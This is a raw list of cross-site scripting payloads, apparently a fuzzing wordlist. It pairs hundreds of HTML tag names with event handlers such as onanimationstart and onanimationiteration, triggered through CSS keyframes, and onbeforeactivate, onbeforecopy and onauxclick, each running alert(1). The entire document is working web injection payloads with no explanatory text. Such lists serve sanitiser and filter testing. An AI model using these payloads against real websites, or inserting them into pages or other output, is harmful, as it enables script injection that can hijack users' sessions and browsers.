<style>@keyframes slidein {}</style><script style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></script>
<style>@keyframes slidein {}</style><section style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></section>
<style>@keyframes slidein {}</style><select style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></select>
<style>@keyframes slidein {}</style><shadow style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></shadow>
<style>@keyframes slidein {}</style><slot style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></slot>
<style>@keyframes slidein {}</style><small style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></small>
<style>@keyframes slidein {}</style><source style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></source>
<style>@keyframes slidein {}</style><spacer style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></spacer>
<style>@keyframes slidein {}</style><span style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></span>
<style>@keyframes slidein {}</style><strike style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></strike>
<style>@keyframes slidein {}</style><strong style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></strong>
<style>@keyframes slidein {}</style><style style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></style>
<style>@keyframes slidein {}</style><sub style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></sub>
<style>@keyframes slidein {}</style><summary style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></summary>
<style>@keyframes slidein {}</style><sup style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></sup>
<style>@keyframes slidein {}</style><svg style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></svg>
<style>@keyframes slidein {}</style><table style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></table>
<style>@keyframes slidein {}</style><tbody style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></tbody>
<style>@keyframes slidein {}</style><td style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></td>
<style>@keyframes slidein {}</style><template style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></template>
<style>@keyframes slidein {}</style><textarea style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></textarea>
<style>@keyframes slidein {}</style><tfoot style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></tfoot>
<style>@keyframes slidein {}</style><th style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></th>
<style>@keyframes slidein {}</style><thead style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></thead>
<style>@keyframes slidein {}</style><time style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></time>
<style>@keyframes slidein {}</style><title style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></title>
<style>@keyframes slidein {}</style><tr style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></tr>
<style>@keyframes slidein {}</style><track style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></track>
<style>@keyframes slidein {}</style><tt style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></tt>
<style>@keyframes slidein {}</style><u style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></u>
<style>@keyframes slidein {}</style><ul style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></ul>
<style>@keyframes slidein {}</style><var style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></var>
<style>@keyframes slidein {}</style><video style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></video>
<style>@keyframes slidein {}</style><wbr style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></wbr>
<style>@keyframes slidein {}</style><xmp style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xmp>
<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>
<style>@keyframes x{}</style><a style="animation-name:x" onanimationstart="alert(1)"></a>
<style>@keyframes x{}</style><abbr style="animation-name:x" onanimationstart="alert(1)"></abbr>
<style>@keyframes x{}</style><acronym style="animation-name:x" onanimationstart="alert(1)"></acronym>
<style>@keyframes x{}</style><address style="animation-name:x" onanimationstart="alert(1)"></address>
<style>@keyframes x{}</style><applet style="animation-name:x" onanimationstart="alert(1)"></applet>
<style>@keyframes x{}</style><area style="animation-name:x" onanimationstart="alert(1)"></area>
<style>@keyframes x{}</style><article style="animation-name:x" onanimationstart="alert(1)"></article>
<style>@keyframes x{}</style><aside style="animation-name:x" onanimationstart="alert(1)"></aside>
<style>@keyframes x{}</style><audio style="animation-name:x" onanimationstart="alert(1)"></audio>
<style>@keyframes x{}</style><b style="animation-name:x" onanimationstart="alert(1)"></b>
<style>@keyframes x{}</style><base style="animation-name:x" onanimationstart="alert(1)"></base>
<style>@keyframes x{}</style><basefont style="animation-name:x" onanimationstart="alert(1)"></basefont>
<style>@keyframes x{}</style><bdi style="animation-name:x" onanimationstart="alert(1)"></bdi>
<style>@keyframes x{}</style><bdo style="animation-name:x" onanimationstart="alert(1)"></bdo>
<style>@keyframes x{}</style><bgsound style="animation-name:x" onanimationstart="alert(1)"></bgsound>
<style>@keyframes x{}</style><big style="animation-name:x" onanimationstart="alert(1)"></big>
<style>@keyframes x{}</style><blink style="animation-name:x" onanimationstart="alert(1)"></blink>
<style>@keyframes x{}</style><blockquote style="animation-name:x" onanimationstart="alert(1)"></blockquote>
<style>@keyframes x{}</style><body style="animation-name:x" onanimationstart="alert(1)"></body>
<style>@keyframes x{}</style><br style="animation-name:x" onanimationstart="alert(1)"></br>
<style>@keyframes x{}</style><button style="animation-name:x" onanimationstart="alert(1)"></button>
<style>@keyframes x{}</style><canvas style="animation-name:x" onanimationstart="alert(1)"></canvas>
<style>@keyframes x{}</style><caption style="animation-name:x" onanimationstart="alert(1)"></caption>
<style>@keyframes x{}</style><center style="animation-name:x" onanimationstart="alert(1)"></center>
<style>@keyframes x{}</style><cite style="animation-name:x" onanimationstart="alert(1)"></cite>
<style>@keyframes x{}</style><code style="animation-name:x" onanimationstart="alert(1)"></code>
<style>@keyframes x{}</style><col style="animation-name:x" onanimationstart="alert(1)"></col>
<style>@keyframes x{}</style><colgroup style="animation-name:x" onanimationstart="alert(1)"></colgroup>
<style>@keyframes x{}</style><command style="animation-name:x" onanimationstart="alert(1)"></command>
<style>@keyframes x{}</style><content style="animation-name:x" onanimationstart="alert(1)"></content>
<style>@keyframes x{}</style><data style="animation-name:x" onanimationstart="alert(1)"></data>
<style>@keyframes x{}</style><datalist style="animation-name:x" onanimationstart="alert(1)"></datalist>
<style>@keyframes x{}</style><dd style="animation-name:x" onanimationstart="alert(1)"></dd>
<style>@keyframes x{}</style><del style="animation-name:x" onanimationstart="alert(1)"></del>
<style>@keyframes x{}</style><details style="animation-name:x" onanimationstart="alert(1)"></details>
<style>@keyframes x{}</style><dfn style="animation-name:x" onanimationstart="alert(1)"></dfn>
<style>@keyframes x{}</style><dialog style="animation-name:x" onanimationstart="alert(1)"></dialog>
<style>@keyframes x{}</style><dir style="animation-name:x" onanimationstart="alert(1)"></dir>
<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)"></div>
<style>@keyframes x{}</style><dl style="animation-name:x" onanimationstart="alert(1)"></dl>
<style>@keyframes x{}</style><dt style="animation-name:x" onanimationstart="alert(1)"></dt>
<style>@keyframes x{}</style><element style="animation-name:x" onanimationstart="alert(1)"></element>
<style>@keyframes x{}</style><em style="animation-name:x" onanimationstart="alert(1)"></em>
<style>@keyframes x{}</style><embed style="animation-name:x" onanimationstart="alert(1)"></embed>
<style>@keyframes x{}</style><fieldset style="animation-name:x" onanimationstart="alert(1)"></fieldset>
<style>@keyframes x{}</style><figcaption style="animation-name:x" onanimationstart="alert(1)"></figcaption>
<style>@keyframes x{}</style><figure style="animation-name:x" onanimationstart="alert(1)"></figure>
<style>@keyframes x{}</style><font style="animation-name:x" onanimationstart="alert(1)"></font>
<style>@keyframes x{}</style><footer style="animation-name:x" onanimationstart="alert(1)"></footer>
<style>@keyframes x{}</style><form style="animation-name:x" onanimationstart="alert(1)"></form>
<style>@keyframes x{}</style><frame style="animation-name:x" onanimationstart="alert(1)"></frame>
<style>@keyframes x{}</style><frameset style="animation-name:x" onanimationstart="alert(1)"></frameset>
<style>@keyframes x{}</style><h1 style="animation-name:x" onanimationstart="alert(1)"></h1>
<style>@keyframes x{}</style><head style="animation-name:x" onanimationstart="alert(1)"></head>
<style>@keyframes x{}</style><header style="animation-name:x" onanimationstart="alert(1)"></header>
<style>@keyframes x{}</style><hgroup style="animation-name:x" onanimationstart="alert(1)"></hgroup>
<style>@keyframes x{}</style><hr style="animation-name:x" onanimationstart="alert(1)"></hr>
<style>@keyframes x{}</style><html style="animation-name:x" onanimationstart="alert(1)"></html>
<style>@keyframes x{}</style><i style="animation-name:x" onanimationstart="alert(1)"></i>
<style>@keyframes x{}</style><iframe style="animation-name:x" onanimationstart="alert(1)"></iframe>
<style>@keyframes x{}</style><image style="animation-name:x" onanimationstart="alert(1)"></image>
<style>@keyframes x{}</style><img style="animation-name:x" onanimationstart="alert(1)"></img>
<style>@keyframes x{}</style><input style="animation-name:x" onanimationstart="alert(1)"></input>
<style>@keyframes x{}</style><ins style="animation-name:x" onanimationstart="alert(1)"></ins>
<style>@keyframes x{}</style><isindex style="animation-name:x" onanimationstart="alert(1)"></isindex>
<style>@keyframes x{}</style><kbd style="animation-name:x" onanimationstart="alert(1)"></kbd>
<style>@keyframes x{}</style><keygen style="animation-name:x" onanimationstart="alert(1)"></keygen>
<style>@keyframes x{}</style><label style="animation-name:x" onanimationstart="alert(1)"></label>
<style>@keyframes x{}</style><legend style="animation-name:x" onanimationstart="alert(1)"></legend>
<style>@keyframes x{}</style><li style="animation-name:x" onanimationstart="alert(1)"></li>
<style>@keyframes x{}</style><link style="animation-name:x" onanimationstart="alert(1)"></link>
<style>@keyframes x{}</style><listing style="animation-name:x" onanimationstart="alert(1)"></listing>
<style>@keyframes x{}</style><main style="animation-name:x" onanimationstart="alert(1)"></main>
<style>@keyframes x{}</style><map style="animation-name:x" onanimationstart="alert(1)"></map>
<style>@keyframes x{}</style><mark style="animation-name:x" onanimationstart="alert(1)"></mark>
<style>@keyframes x{}</style><marquee style="animation-name:x" onanimationstart="alert(1)"></marquee>
<style>@keyframes x{}</style><menu style="animation-name:x" onanimationstart="alert(1)"></menu>
<style>@keyframes x{}</style><menuitem style="animation-name:x" onanimationstart="alert(1)"></menuitem>
<style>@keyframes x{}</style><meta style="animation-name:x" onanimationstart="alert(1)"></meta>
<style>@keyframes x{}</style><meter style="animation-name:x" onanimationstart="alert(1)"></meter>
<style>@keyframes x{}</style><multicol style="animation-name:x" onanimationstart="alert(1)"></multicol>
<style>@keyframes x{}</style><nav style="animation-name:x" onanimationstart="alert(1)"></nav>
<style>@keyframes x{}</style><nextid style="animation-name:x" onanimationstart="alert(1)"></nextid>
<style>@keyframes x{}</style><nobr style="animation-name:x" onanimationstart="alert(1)"></nobr>
<style>@keyframes x{}</style><noembed style="animation-name:x" onanimationstart="alert(1)"></noembed>
<style>@keyframes x{}</style><noframes style="animation-name:x" onanimationstart="alert(1)"></noframes>
<style>@keyframes x{}</style><noscript style="animation-name:x" onanimationstart="alert(1)"></noscript>
<style>@keyframes x{}</style><object style="animation-name:x" onanimationstart="alert(1)"></object>
<style>@keyframes x{}</style><ol style="animation-name:x" onanimationstart="alert(1)"></ol>
<style>@keyframes x{}</style><optgroup style="animation-name:x" onanimationstart="alert(1)"></optgroup>
<style>@keyframes x{}</style><option style="animation-name:x" onanimationstart="alert(1)"></option>
<style>@keyframes x{}</style><output style="animation-name:x" onanimationstart="alert(1)"></output>
<style>@keyframes x{}</style><p style="animation-name:x" onanimationstart="alert(1)"></p>
<style>@keyframes x{}</style><param style="animation-name:x" onanimationstart="alert(1)"></param>
<style>@keyframes x{}</style><picture style="animation-name:x" onanimationstart="alert(1)"></picture>
<style>@keyframes x{}</style><plaintext style="animation-name:x" onanimationstart="alert(1)"></plaintext>
<style>@keyframes x{}</style><pre style="animation-name:x" onanimationstart="alert(1)"></pre>
<style>@keyframes x{}</style><progress style="animation-name:x" onanimationstart="alert(1)"></progress>
<style>@keyframes x{}</style><q style="animation-name:x" onanimationstart="alert(1)"></q>
<style>@keyframes x{}</style><rb style="animation-name:x" onanimationstart="alert(1)"></rb>
<style>@keyframes x{}</style><rp style="animation-name:x" onanimationstart="alert(1)"></rp>
<style>@keyframes x{}</style><rt style="animation-name:x" onanimationstart="alert(1)"></rt>
<style>@keyframes x{}</style><rtc style="animation-name:x" onanimationstart="alert(1)"></rtc>
<style>@keyframes x{}</style><ruby style="animation-name:x" onanimationstart="alert(1)"></ruby>
<style>@keyframes x{}</style><s style="animation-name:x" onanimationstart="alert(1)"></s>
<style>@keyframes x{}</style><samp style="animation-name:x" onanimationstart="alert(1)"></samp>
<style>@keyframes x{}</style><script style="animation-name:x" onanimationstart="alert(1)"></script>
<style>@keyframes x{}</style><section style="animation-name:x" onanimationstart="alert(1)"></section>
<style>@keyframes x{}</style><select style="animation-name:x" onanimationstart="alert(1)"></select>
<style>@keyframes x{}</style><shadow style="animation-name:x" onanimationstart="alert(1)"></shadow>
<style>@keyframes x{}</style><slot style="animation-name:x" onanimationstart="alert(1)"></slot>
<style>@keyframes x{}</style><small style="animation-name:x" onanimationstart="alert(1)"></small>
<style>@keyframes x{}</style><source style="animation-name:x" onanimationstart="alert(1)"></source>
<style>@keyframes x{}</style><spacer style="animation-name:x" onanimationstart="alert(1)"></spacer>
<style>@keyframes x{}</style><span style="animation-name:x" onanimationstart="alert(1)"></span>
<style>@keyframes x{}</style><strike style="animation-name:x" onanimationstart="alert(1)"></strike>
<style>@keyframes x{}</style><strong style="animation-name:x" onanimationstart="alert(1)"></strong>
<style>@keyframes x{}</style><style style="animation-name:x" onanimationstart="alert(1)"></style>
<style>@keyframes x{}</style><sub style="animation-name:x" onanimationstart="alert(1)"></sub>
<style>@keyframes x{}</style><summary style="animation-name:x" onanimationstart="alert(1)"></summary>
<style>@keyframes x{}</style><sup style="animation-name:x" onanimationstart="alert(1)"></sup>
<style>@keyframes x{}</style><svg style="animation-name:x" onanimationstart="alert(1)"></svg>
<style>@keyframes x{}</style><table style="animation-name:x" onanimationstart="alert(1)"></table>
<style>@keyframes x{}</style><tbody style="animation-name:x" onanimationstart="alert(1)"></tbody>
<style>@keyframes x{}</style><td style="animation-name:x" onanimationstart="alert(1)"></td>
<style>@keyframes x{}</style><template style="animation-name:x" onanimationstart="alert(1)"></template>
<style>@keyframes x{}</style><textarea style="animation-name:x" onanimationstart="alert(1)"></textarea>
<style>@keyframes x{}</style><tfoot style="animation-name:x" onanimationstart="alert(1)"></tfoot>
<style>@keyframes x{}</style><th style="animation-name:x" onanimationstart="alert(1)"></th>
<style>@keyframes x{}</style><thead style="animation-name:x" onanimationstart="alert(1)"></thead>
<style>@keyframes x{}</style><time style="animation-name:x" onanimationstart="alert(1)"></time>
<style>@keyframes x{}</style><title style="animation-name:x" onanimationstart="alert(1)"></title>
<style>@keyframes x{}</style><tr style="animation-name:x" onanimationstart="alert(1)"></tr>
<style>@keyframes x{}</style><track style="animation-name:x" onanimationstart="alert(1)"></track>
<style>@keyframes x{}</style><tt style="animation-name:x" onanimationstart="alert(1)"></tt>
<style>@keyframes x{}</style><u style="animation-name:x" onanimationstart="alert(1)"></u>
<style>@keyframes x{}</style><ul style="animation-name:x" onanimationstart="alert(1)"></ul>
<style>@keyframes x{}</style><var style="animation-name:x" onanimationstart="alert(1)"></var>
<style>@keyframes x{}</style><video style="animation-name:x" onanimationstart="alert(1)"></video>
<style>@keyframes x{}</style><wbr style="animation-name:x" onanimationstart="alert(1)"></wbr>
<style>@keyframes x{}</style><xmp style="animation-name:x" onanimationstart="alert(1)"></xmp>
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
<input onauxclick=alert(1)>
<textarea onauxclick=alert(1)>XSS</textarea>
<a id=x tabindex=1 onbeforeactivate=alert(1)></a>
<abbr id=x tabindex=1 onbeforeactivate=alert(1)></abbr>
<acronym id=x tabindex=1 onbeforeactivate=alert(1)></acronym>
<address id=x tabindex=1 onbeforeactivate=alert(1)></address>
<applet id=x tabindex=1 onbeforeactivate=alert(1)></applet>
<area id=x tabindex=1 onbeforeactivate=alert(1)></area>
<article id=x tabindex=1 onbeforeactivate=alert(1)></article>
<aside id=x tabindex=1 onbeforeactivate=alert(1)></aside>
<audio id=x tabindex=1 onbeforeactivate=alert(1)></audio>
<b id=x tabindex=1 onbeforeactivate=alert(1)></b>
<base id=x tabindex=1 onbeforeactivate=alert(1)></base>
<basefont id=x tabindex=1 onbeforeactivate=alert(1)></basefont>
<bdi id=x tabindex=1 onbeforeactivate=alert(1)></bdi>
<bdo id=x tabindex=1 onbeforeactivate=alert(1)></bdo>
<bgsound id=x tabindex=1 onbeforeactivate=alert(1)></bgsound>
<big id=x tabindex=1 onbeforeactivate=alert(1)></big>
<blink id=x tabindex=1 onbeforeactivate=alert(1)></blink>
<blockquote id=x tabindex=1 onbeforeactivate=alert(1)></blockquote>
<body id=x tabindex=1 onbeforeactivate=alert(1)></body>
<br id=x tabindex=1 onbeforeactivate=alert(1)></br>
<button id=x tabindex=1 onbeforeactivate=alert(1)></button>
<canvas id=x tabindex=1 onbeforeactivate=alert(1)></canvas>
<caption id=x tabindex=1 onbeforeactivate=alert(1)></caption>
<center id=x tabindex=1 onbeforeactivate=alert(1)></center>
<cite id=x tabindex=1 onbeforeactivate=alert(1)></cite>
<code id=x tabindex=1 onbeforeactivate=alert(1)></code>
<col id=x tabindex=1 onbeforeactivate=alert(1)></col>
<colgroup id=x tabindex=1 onbeforeactivate=alert(1)></colgroup>
<command id=x tabindex=1 onbeforeactivate=alert(1)></command>
<content id=x tabindex=1 onbeforeactivate=alert(1)></content>
<data id=x tabindex=1 onbeforeactivate=alert(1)></data>
<datalist id=x tabindex=1 onbeforeactivate=alert(1)></datalist>
<dd id=x tabindex=1 onbeforeactivate=alert(1)></dd>
<del id=x tabindex=1 onbeforeactivate=alert(1)></del>
<details id=x tabindex=1 onbeforeactivate=alert(1)></details>
<dfn id=x tabindex=1 onbeforeactivate=alert(1)></dfn>
<dialog id=x tabindex=1 onbeforeactivate=alert(1)></dialog>
<dir id=x tabindex=1 onbeforeactivate=alert(1)></dir>
<div id=x tabindex=1 onbeforeactivate=alert(1)></div>
<dl id=x tabindex=1 onbeforeactivate=alert(1)></dl>
<dt id=x tabindex=1 onbeforeactivate=alert(1)></dt>
<element id=x tabindex=1 onbeforeactivate=alert(1)></element>
<em id=x tabindex=1 onbeforeactivate=alert(1)></em>
<embed id=x tabindex=1 onbeforeactivate=alert(1)></embed>
<fieldset id=x tabindex=1 onbeforeactivate=alert(1)></fieldset>
<figcaption id=x tabindex=1 onbeforeactivate=alert(1)></figcaption>
<figure id=x tabindex=1 onbeforeactivate=alert(1)></figure>
<font id=x tabindex=1 onbeforeactivate=alert(1)></font>
<footer id=x tabindex=1 onbeforeactivate=alert(1)></footer>
<form id=x tabindex=1 onbeforeactivate=alert(1)></form>
<frame id=x tabindex=1 onbeforeactivate=alert(1)></frame>
<frameset id=x tabindex=1 onbeforeactivate=alert(1)></frameset>
<h1 id=x tabindex=1 onbeforeactivate=alert(1)></h1>
<head id=x tabindex=1 onbeforeactivate=alert(1)></head>
<header id=x tabindex=1 onbeforeactivate=alert(1)></header>
<hgroup id=x tabindex=1 onbeforeactivate=alert(1)></hgroup>
<hr id=x tabindex=1 onbeforeactivate=alert(1)></hr>
<html id=x tabindex=1 onbeforeactivate=alert(1)></html>
<i id=x tabindex=1 onbeforeactivate=alert(1)></i>
<iframe id=x tabindex=1 onbeforeactivate=alert(1)></iframe>
<image id=x tabindex=1 onbeforeactivate=alert(1)></image>
<img id=x tabindex=1 onbeforeactivate=alert(1)></img>
<input id=x tabindex=1 onbeforeactivate=alert(1)></input>
<ins id=x tabindex=1 onbeforeactivate=alert(1)></ins>
<isindex id=x tabindex=1 onbeforeactivate=alert(1)></isindex>
<kbd id=x tabindex=1 onbeforeactivate=alert(1)></kbd>
<keygen id=x tabindex=1 onbeforeactivate=alert(1)></keygen>
<label id=x tabindex=1 onbeforeactivate=alert(1)></label>
<legend id=x tabindex=1 onbeforeactivate=alert(1)></legend>
<li id=x tabindex=1 onbeforeactivate=alert(1)></li>
<link id=x tabindex=1 onbeforeactivate=alert(1)></link>
<listing id=x tabindex=1 onbeforeactivate=alert(1)></listing>
<main id=x tabindex=1 onbeforeactivate=alert(1)></main>
<map id=x tabindex=1 onbeforeactivate=alert(1)></map>
<mark id=x tabindex=1 onbeforeactivate=alert(1)></mark>
<marquee id=x tabindex=1 onbeforeactivate=alert(1)></marquee>
<menu id=x tabindex=1 onbeforeactivate=alert(1)></menu>
<menuitem id=x tabindex=1 onbeforeactivate=alert(1)></menuitem>
<meta id=x tabindex=1 onbeforeactivate=alert(1)></meta>
<meter id=x tabindex=1 onbeforeactivate=alert(1)></meter>
<multicol id=x tabindex=1 onbeforeactivate=alert(1)></multicol>
<nav id=x tabindex=1 onbeforeactivate=alert(1)></nav>
<nextid id=x tabindex=1 onbeforeactivate=alert(1)></nextid>
<nobr id=x tabindex=1 onbeforeactivate=alert(1)></nobr>
<noembed id=x tabindex=1 onbeforeactivate=alert(1)></noembed>
<noframes id=x tabindex=1 onbeforeactivate=alert(1)></noframes>
<noscript id=x tabindex=1 onbeforeactivate=alert(1)></noscript>
<object id=x tabindex=1 onbeforeactivate=alert(1)></object>
<ol id=x tabindex=1 onbeforeactivate=alert(1)></ol>
<optgroup id=x tabindex=1 onbeforeactivate=alert(1)></optgroup>
<option id=x tabindex=1 onbeforeactivate=alert(1)></option>
<output id=x tabindex=1 onbeforeactivate=alert(1)></output>
<p id=x tabindex=1 onbeforeactivate=alert(1)></p>
<param id=x tabindex=1 onbeforeactivate=alert(1)></param>
<picture id=x tabindex=1 onbeforeactivate=alert(1)></picture>
<plaintext id=x tabindex=1 onbeforeactivate=alert(1)></plaintext>
<pre id=x tabindex=1 onbeforeactivate=alert(1)></pre>
<progress id=x tabindex=1 onbeforeactivate=alert(1)></progress>
<q id=x tabindex=1 onbeforeactivate=alert(1)></q>
<rb id=x tabindex=1 onbeforeactivate=alert(1)></rb>
<rp id=x tabindex=1 onbeforeactivate=alert(1)></rp>
<rt id=x tabindex=1 onbeforeactivate=alert(1)></rt>
<rtc id=x tabindex=1 onbeforeactivate=alert(1)></rtc>
<ruby id=x tabindex=1 onbeforeactivate=alert(1)></ruby>
<s id=x tabindex=1 onbeforeactivate=alert(1)></s>
<samp id=x tabindex=1 onbeforeactivate=alert(1)></samp>
<script id=x tabindex=1 onbeforeactivate=alert(1)></script>
<section id=x tabindex=1 onbeforeactivate=alert(1)></section>
<select id=x tabindex=1 onbeforeactivate=alert(1)></select>
<shadow id=x tabindex=1 onbeforeactivate=alert(1)></shadow>
<slot id=x tabindex=1 onbeforeactivate=alert(1)></slot>
<small id=x tabindex=1 onbeforeactivate=alert(1)></small>
<source id=x tabindex=1 onbeforeactivate=alert(1)></source>
<spacer id=x tabindex=1 onbeforeactivate=alert(1)></spacer>
<span id=x tabindex=1 onbeforeactivate=alert(1)></span>
<strike id=x tabindex=1 onbeforeactivate=alert(1)></strike>
<strong id=x tabindex=1 onbeforeactivate=alert(1)></strong>
<style id=x tabindex=1 onbeforeactivate=alert(1)></style>
<sub id=x tabindex=1 onbeforeactivate=alert(1)></sub>
<summary id=x tabindex=1 onbeforeactivate=alert(1)></summary>
<sup id=x tabindex=1 onbeforeactivate=alert(1)></sup>
<svg id=x tabindex=1 onbeforeactivate=alert(1)></svg>
<table id=x tabindex=1 onbeforeactivate=alert(1)></table>
<tbody id=x tabindex=1 onbeforeactivate=alert(1)></tbody>
<td id=x tabindex=1 onbeforeactivate=alert(1)></td>
<template id=x tabindex=1 onbeforeactivate=alert(1)></template>
<textarea id=x tabindex=1 onbeforeactivate=alert(1)></textarea>
<tfoot id=x tabindex=1 onbeforeactivate=alert(1)></tfoot>
<th id=x tabindex=1 onbeforeactivate=alert(1)></th>
<thead id=x tabindex=1 onbeforeactivate=alert(1)></thead>
<time id=x tabindex=1 onbeforeactivate=alert(1)></time>
<title id=x tabindex=1 onbeforeactivate=alert(1)></title>
<tr id=x tabindex=1 onbeforeactivate=alert(1)></tr>
<track id=x tabindex=1 onbeforeactivate=alert(1)></track>
<tt id=x tabindex=1 onbeforeactivate=alert(1)></tt>
<u id=x tabindex=1 onbeforeactivate=alert(1)></u>
<ul id=x tabindex=1 onbeforeactivate=alert(1)></ul>
<var id=x tabindex=1 onbeforeactivate=alert(1)></var>
<video id=x tabindex=1 onbeforeactivate=alert(1)></video>
<wbr id=x tabindex=1 onbeforeactivate=alert(1)></wbr>
<xmp id=x tabindex=1 onbeforeactivate=alert(1)></xmp>
<xss id=x tabindex=1 onbeforeactivate=alert(1)></xss>
<input onbeforecopy=alert(1) value="XSS" autofocus>
<textarea onbeforecopy=alert(1) autofocus>XSS</textarea>
<a onbeforecopy="alert(1)" contenteditable>test</a>
<abbr onbeforecopy="alert(1)" contenteditable>test</abbr>
<acronym onbeforecopy="alert(1)" contenteditable>test</acronym>
<address onbeforecopy="alert(1)" contenteditable>test</address>
<applet onbeforecopy="alert(1)" contenteditable>test</applet>
<area onbeforecopy="alert(1)" contenteditable>test</area>
<article onbeforecopy="alert(1)" contenteditable>test</article>
<aside onbeforecopy="alert(1)" contenteditable>test</aside>
<audio onbeforecopy="alert(1)" contenteditable>test</audio>
<b onbeforecopy="alert(1)" contenteditable>test</b>
<base onbeforecopy="alert(1)" contenteditable>test</base>
<basefont onbeforecopy="alert(1)" contenteditable>test</basefont>
<bdi onbeforecopy="alert(1)" contenteditable>test</bdi>
<bdo onbeforecopy="alert(1)" contenteditable>test</bdo>
<bgsound onbeforecopy="alert(1)" contenteditable>test</bgsound>
<big onbeforecopy="alert(1)" contenteditable>test</big>
<blink onbeforecopy="alert(1)" contenteditable>test</blink>
<blockquote onbeforecopy="alert(1)" contenteditable>test</blockquote>
<body onbeforecopy="alert(1)" contenteditable>test</body>
<br onbeforecopy="alert(1)" contenteditable>test</br>
<button onbeforecopy="alert(1)" contenteditable>test</button>
<canvas onbeforecopy="alert(1)" contenteditable>test</canvas>
<caption onbeforecopy="alert(1)" contenteditable>test</caption>
<center onbeforecopy="alert(1)" contenteditable>test</center>
<cite onbeforecopy="alert(1)" contenteditable>test</cite>
<code onbeforecopy="alert(1)" contenteditable>test</code>
<col onbeforecopy="alert(1)" contenteditable>test</col>
<colgroup onbeforecopy="alert(1)" contenteditable>test</colgroup>
<command onbeforecopy="alert(1)" contenteditable>test</command>
<content onbeforecopy="alert(1)" contenteditable>test</content>
<data onbeforecopy="alert(1)" contenteditable>test</data>
<datalist onbeforecopy="alert(1)" contenteditable>test</datalist>
<dd onbeforecopy="alert(1)" contenteditable>test</dd>
<del onbeforecopy="alert(1)" contenteditable>test</del>
<details onbeforecopy="alert(1)" contenteditable>test</details>
<dfn onbeforecopy="alert(1)" contenteditable>test</dfn>
<dialog onbeforecopy="alert(1)" contenteditable>test</dialog>
<dir onbeforecopy="alert(1)" contenteditable>test</dir>
<div onbeforecopy="alert(1)" contenteditable>test</div>
<dl onbeforecopy="alert(1)" contenteditable>test</dl>
<dt onbeforecopy="alert(1)" contenteditable>test</dt>
<element onbeforecopy="alert(1)" contenteditable>test</element>
<em onbeforecopy="alert(1)" contenteditable>test</em>
<embed onbeforecopy="alert(1)" contenteditable>test</embed>
<fieldset onbeforecopy="alert(1)" contenteditable>test</fieldset>
<figcaption onbeforecopy="alert(1)" contenteditable>test</figcaption>
<figure onbeforecopy="alert(1)" contenteditable>test</figure>
<font onbeforecopy="alert(1)" contenteditable>test</font>
<footer onbeforecopy="alert(1)" contenteditable>test</footer>
<form onbeforecopy="alert(1)" contenteditable>test</form>
<frame onbeforecopy="alert(1)" contenteditable>test</frame>
<frameset onbeforecopy="alert(1)" contenteditable>test</frameset>
<h1 onbeforecopy="alert(1)" contenteditable>test</h1>
<head onbeforecopy="alert(1)" contenteditable>test</head>
<header onbeforecopy="alert(1)" contenteditable>test</header>
<hgroup onbeforecopy="alert(1)" contenteditable>test</hgroup>
<hr onbeforecopy="alert(1)" contenteditable>test</hr>
<html onbeforecopy="alert(1)" contenteditable>test</html>
<i onbeforecopy="alert(1)" contenteditable>test</i>
<iframe onbeforecopy="alert(1)" contenteditable>test</iframe>
<image onbeforecopy="alert(1)" contenteditable>test</image>
<img onbeforecopy="alert(1)" contenteditable>test</img>
<ins onbeforecopy="alert(1)" contenteditable>test</ins>
<isindex onbeforecopy="alert(1)" contenteditable>test</isindex>
